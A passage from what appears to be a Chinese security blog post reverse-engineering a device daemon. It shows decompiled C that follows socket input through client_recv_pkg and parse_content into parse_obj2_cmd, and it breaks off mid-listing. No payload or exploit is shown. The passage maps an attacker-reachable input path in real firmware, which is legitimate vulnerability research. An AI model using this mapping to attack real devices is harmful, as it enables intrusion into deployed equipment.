<span class="number">12</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( sock + <span class="number">3</span> == &amp;dword_436364 )</span><br><span class="line">              &#123;</span><br><span class="line">                pthread_mutex_unlock(&amp;unk_436370);</span><br><span class="line">LABEL_94:</span><br><span class="line">                v17 = v15 &lt; <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( *sock == <span class="number">-1</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_91;</span><br><span class="line">              v30 = i;</span><br><span class="line">              <span class="keyword">if</span> ( ((g_fd_set[*sock &gt;&gt; <span class="number">5</span>] &gt;&gt; *sock) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">              <span class="keyword">if</span> ( g_pkg_cnt &lt; <span class="number">101</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)packet full!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;client_recv_pkg&quot;</span>);</span><br><span class="line">LABEL_91:</span><br><span class="line">              v30 = i;</span><br><span class="line">LABEL_92:</span><br><span class="line">              sock = (_DWORD *)v30;</span><br><span class="line">            &#125;</span><br><span class="line">            addr = malloc_pkg();</span><br><span class="line">            <span class="keyword">if</span> ( !addr )</span><br><span class="line">            &#123;</span><br><span class="line">              uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory full!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;client_recv_pkg&quot;</span>);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_91;</span><br><span class="line">            &#125;</span><br><span class="line">            pthread_mutex_lock(sock + <span class="number">5</span>);       <span class="comment">// 上锁</span></span><br><span class="line">            *addr = sock;</span><br><span class="line">            aa = (_DWORD *)uf_socket_msg_read(*sock, addr + <span class="number">1</span>);<span class="comment">// ######################target####################</span></span><br><span class="line">            pthread_mutex_unlock(sock + <span class="number">5</span>);     <span class="comment">// 解锁</span></span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">int</span>)aa &lt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              sub_404A34(sock + <span class="number">3</span>);</span><br><span class="line">              <span class="keyword">if</span> ( g_sgi_client_mgr &gt; <span class="number">0</span> )</span><br><span class="line">                --g_sgi_client_mgr;</span><br><span class="line">              <span class="keyword">if</span> ( sub_405238(sock) )</span><br><span class="line">              &#123;</span><br><span class="line">                v32 = (_DWORD *)dword_436368;</span><br><span class="line">                dword_436368 = (<span class="type">int</span>)(sock + <span class="number">3</span>);</span><br><span class="line">                sock[<span class="number">4</span>] = v32;</span><br><span class="line">                sock[<span class="number">3</span>] = &amp;dword_436364;</span><br><span class="line">                *v32 = sock + <span class="number">3</span>;</span><br><span class="line">                ++g_sgi_client_mgr;</span><br><span class="line">              &#125;</span><br><span class="line">              v33 = addr[<span class="number">1</span>];</span><br><span class="line">              <span class="keyword">if</span> ( v33 )</span><br><span class="line">                <span class="built_in">free</span>(v33);</span><br><span class="line">LABEL_90:</span><br><span class="line">              <span class="built_in">free</span>(addr);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_91;</span><br><span class="line">            &#125;</span><br><span class="line">            method = (<span class="type">const</span> <span class="type">char</span> *)addr[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> ( method )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( <span class="built_in">strstr</span>(addr[<span class="number">1</span>], <span class="string">&quot;.get&quot;</span>) )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( g_debug &lt; <span class="number">3</span> )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">                v35 = <span class="built_in">strlen</span>(method);</span><br><span class="line">                v36 = <span class="number">735</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( g_debug &lt; <span class="number">2</span> )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">                v35 = <span class="built_in">strlen</span>(method);</span><br><span class="line">                v36 = <span class="number">733</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              uf_log_printf(</span><br><span class="line">                uf_log,</span><br><span class="line">                <span class="string">&quot;(%s %s %d)------[%x][%d][%d]package buf:%s&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;client_recv_pkg&quot;</span>,</span><br><span class="line">                v36,</span><br><span class="line">                addr,</span><br><span class="line">                *(_DWORD *)*addr,</span><br><span class="line">                v35,</span><br><span class="line">                method);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              uf_log_printf(</span><br><span class="line">                uf_log,</span><br><span class="line">                <span class="string">&quot;ERROR (%s %s %d)------[%x][%d]package buf is NULL!&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;client_recv_pkg&quot;</span>,</span><br><span class="line">                <span class="number">738</span>,</span><br><span class="line">                addr,</span><br><span class="line">                *(_DWORD *)*addr);</span><br><span class="line">            &#125;</span><br><span class="line">LABEL_82:</span><br><span class="line">            <span class="keyword">if</span> ( !parse_content((<span class="type">int</span>)addr) )</span><br><span class="line">            &#123;</span><br><span class="line">              pthread_mutex_lock(sock + <span class="number">5</span>);</span><br><span class="line">              v38 = (_DWORD *)sock[<span class="number">2</span>];</span><br><span class="line">              sock[<span class="number">2</span>] = addr + <span class="number">24</span>;</span><br><span class="line">              addr[<span class="number">24</span>] = sock + <span class="number">1</span>;</span><br><span class="line">              addr[<span class="number">25</span>] = v38;</span><br><span class="line">              *v38 = addr + <span class="number">24</span>;</span><br><span class="line">              sock[<span class="number">12</span>] = <span class="number">20</span>;</span><br><span class="line">              sock[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">              pthread_mutex_unlock(sock + <span class="number">5</span>);</span><br><span class="line">              <span class="keyword">if</span> ( !add_pkg_cmd2_task(addr) )</span><br><span class="line">              &#123;</span><br><span class="line">                v30 = i;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)recv package failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;client_recv_pkg&quot;</span>, <span class="number">765</span>);</span><br><span class="line">            v37 = addr[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> ( v37 )</span><br><span class="line">              <span class="built_in">free</span>(v37);</span><br><span class="line">            v39 = (_DWORD *)addr[<span class="number">22</span>];</span><br><span class="line">            v40 = v39 - <span class="number">13</span>;</span><br><span class="line">            v41 = *v39 - <span class="number">52</span>;</span><br><span class="line">            aa = addr + <span class="number">22</span>;</span><br><span class="line">            <span class="keyword">while</span> ( v40 + <span class="number">13</span> != aa )</span><br><span class="line">            &#123;</span><br><span class="line">              sub_404A34(v40 + <span class="number">13</span>);</span><br><span class="line">              v42 = v40;</span><br><span class="line">              v40 = (_DWORD *)v41;</span><br><span class="line">              free_cmd(v42);</span><br><span class="line">              v41 = *(_DWORD *)(v41 + <span class="number">52</span>) - <span class="number">52</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_90;</span><br><span class="line">          &#125;</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)failed to init mutex!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;sgi_client_malloc&quot;</span>, <span class="number">1171</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)client malloc failed %d&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;sgi_accept_client&quot;</span>, <span class="number">1404</span>, v24);</span><br><span class="line">        close(v24);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v14 )</span><br><span class="line">      &#123;</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/uniframe_sgi/unifyframe_sgi.sock&quot;</span>);</span><br><span class="line">        close(v15);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_mutex_destroy(&amp;unk_436370);</span><br><span class="line">LABEL_98:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)ufm_ini failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现一样的长，一样的震撼</p><p>但是前面基本没啥用只看read之后的部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">pthread_mutex_lock(sock + <span class="number">5</span>);       <span class="comment">// 上锁</span></span><br><span class="line">*addr = sock;</span><br><span class="line">aa = (_DWORD *)uf_socket_msg_read(*sock, addr + <span class="number">1</span>);<span class="comment">// ######################target####################</span></span><br><span class="line">pthread_mutex_unlock(sock + <span class="number">5</span>);     <span class="comment">// 解锁</span></span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">int</span>)aa &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">   .......</span><br><span class="line">&#125;</span><br><span class="line">method = (<span class="type">const</span> <span class="type">char</span> *)addr[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> ( method )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(addr[<span class="number">1</span>], <span class="string">&quot;.get&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( g_debug &lt; <span class="number">3</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">        v35 = <span class="built_in">strlen</span>(method);</span><br><span class="line">        v36 = <span class="number">735</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( g_debug &lt; <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">        v35 = <span class="built_in">strlen</span>(method);</span><br><span class="line">        v36 = <span class="number">733</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)------[%x][%d][%d]package buf:%s&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;client_recv_pkg&quot;</span>,</span><br><span class="line">        v36,</span><br><span class="line">        addr,</span><br><span class="line">        *(_DWORD *)*addr,</span><br><span class="line">        v35,</span><br><span class="line">        method);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;ERROR (%s %s %d)------[%x][%d]package buf is NULL!&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;client_recv_pkg&quot;</span>,</span><br><span class="line">        <span class="number">738</span>,</span><br><span class="line">        addr,</span><br><span class="line">        *(_DWORD *)*addr);</span><br><span class="line">&#125;</span><br><span class="line">LABEL_82:</span><br><span class="line"><span class="keyword">if</span> ( !parse_content((<span class="type">int</span>)addr) )</span><br><span class="line">&#123;</span><br><span class="line">    pthread_mutex_lock(sock + <span class="number">5</span>);</span><br><span class="line">    v38 = (_DWORD *)sock[<span class="number">2</span>];</span><br><span class="line">    sock[<span class="number">2</span>] = addr + <span class="number">24</span>;</span><br><span class="line">    addr[<span class="number">24</span>] = sock + <span class="number">1</span>;</span><br><span class="line">    addr[<span class="number">25</span>] = v38;</span><br><span class="line">    *v38 = addr + <span class="number">24</span>;</span><br><span class="line">    sock[<span class="number">12</span>] = <span class="number">20</span>;</span><br><span class="line">    sock[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    pthread_mutex_unlock(sock + <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !add_pkg_cmd2_task(addr) )</span><br><span class="line">    &#123;</span><br><span class="line">        v30 = i;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read接收数据将数据放到addr上，之后</p><p>主要就是调用这个if</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !parse_content((<span class="type">int</span>)addr) )</span><br><span class="line">&#123;</span><br><span class="line">    pthread_mutex_lock(sock + <span class="number">5</span>);</span><br><span class="line">    v38 = (_DWORD *)sock[<span class="number">2</span>];</span><br><span class="line">    sock[<span class="number">2</span>] = addr + <span class="number">24</span>;</span><br><span class="line">    addr[<span class="number">24</span>] = sock + <span class="number">1</span>;</span><br><span class="line">    addr[<span class="number">25</span>] = v38;</span><br><span class="line">    *v38 = addr + <span class="number">24</span>;</span><br><span class="line">    sock[<span class="number">12</span>] = <span class="number">20</span>;</span><br><span class="line">    sock[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    pthread_mutex_unlock(sock + <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !add_pkg_cmd2_task(addr) )</span><br><span class="line">    &#123;</span><br><span class="line">        v30 = i;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_92;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个函数parse_content</p><h4 id="parse-content"><a href="#parse-content" class="headerlink" title="parse_content"></a>parse_content</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">parse_content</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> json; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *<span class="built_in">string</span>; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> method_string; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">int</span> *v12; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> *v14; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> addr; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [sp+20h] [-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> device; <span class="comment">// [sp+24h] [-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> params; <span class="comment">// [sp+28h] [-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> method; <span class="comment">// [sp+2Ch] [-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">598</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(a1 + <span class="number">4</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  v3 = json_tokener_parse();                    <span class="comment">// 解析json数据</span></span><br><span class="line">  json = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">605</span>;</span><br><span class="line">LABEL_4:</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)para invalid!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, v2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v3, <span class="string">&quot;params&quot;</span>, &amp;params) != <span class="number">1</span> )<span class="comment">// 提取param数据</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;device&quot;</span>, &amp;device) == <span class="number">1</span> &amp;&amp; json_object_get_type(device) == <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = (<span class="type">const</span> <span class="type">char</span> *)json_object_get_string(device);</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)caller:%s&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, <span class="number">621</span>, <span class="built_in">string</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;method&quot;</span>, &amp;method) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_31:</span><br><span class="line">    json_object_put(json);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  method_string = json_object_get_string(method);</span><br><span class="line">  <span class="keyword">if</span> ( !method_string )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)Get method failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(method_string, <span class="string">&quot;cmdArr&quot;</span>) )        <span class="comment">// 如果method包含cmdArr，显然不包含</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = params;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">56</span>) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( json_object_object_get_ex(v8, <span class="string">&quot;params&quot;</span>, &amp;v16) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v10 = json_object_array_length(v16);</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">52</span>) = v10;</span><br><span class="line">    <span class="keyword">while</span> ( v9 &lt; v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      idx = json_object_array_get_idx(v16, v9);</span><br><span class="line">      <span class="keyword">if</span> ( idx )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = (<span class="type">int</span> *)malloc_cmd();</span><br><span class="line">        <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)cmd paras failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, <span class="number">654</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v13 = parse_obj2_cmd(idx, <span class="built_in">string</span>);</span><br><span class="line">        *v12 = v13;</span><br><span class="line">        <span class="keyword">if</span> ( !v13 )</span><br><span class="line">        &#123;</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)cmd paras failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, <span class="number">659</span>);</span><br><span class="line">          json_object_put(json);</span><br><span class="line">          free_cmd(v12);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pkg_add_cmd(a1, v12);</span><br><span class="line">        v12[<span class="number">2</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v9;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">52</span>) = <span class="number">1</span>;</span><br><span class="line">    v14 = (<span class="type">int</span> *)malloc_cmd();</span><br><span class="line">    <span class="keyword">if</span> ( !v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory full!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    addr = parse_obj2_cmd(json, <span class="built_in">string</span>);</span><br><span class="line">    *v14 = addr;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)cmd paras failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, <span class="number">679</span>);</span><br><span class="line">      free_cmd(v14);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    pkg_add_cmd(a1, v14);</span><br><span class="line">    v14[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  json_object_put(json);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>算是初步解析json数据，然后调用parse_obj2_cmd函数</p><h4 id="parse-obj2-cmd"><a href="#parse-obj2-cmd" class="headerlink" title="parse_obj2_cmd"></a>parse_obj2_cmd</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 